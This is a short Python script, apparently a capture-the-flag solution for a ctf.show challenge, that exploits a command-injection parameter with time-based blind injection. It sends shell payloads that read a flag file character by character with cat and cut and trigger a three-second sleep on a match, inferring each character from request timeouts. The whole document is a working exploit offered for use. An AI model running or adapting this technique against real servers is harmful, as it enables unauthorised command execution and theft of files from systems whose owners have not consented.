import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
    #print(j)
    if key==1:
        break
    for n in str:
        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
        url="http://5fd5973f-3879-413f-9bfc-f3913f618e5f.challenge.ctf.show/?c="+payload
        try:
            requests.get(url,timeout=(2.5,2.5))
        except:
            result=result+n
            print(result)
            break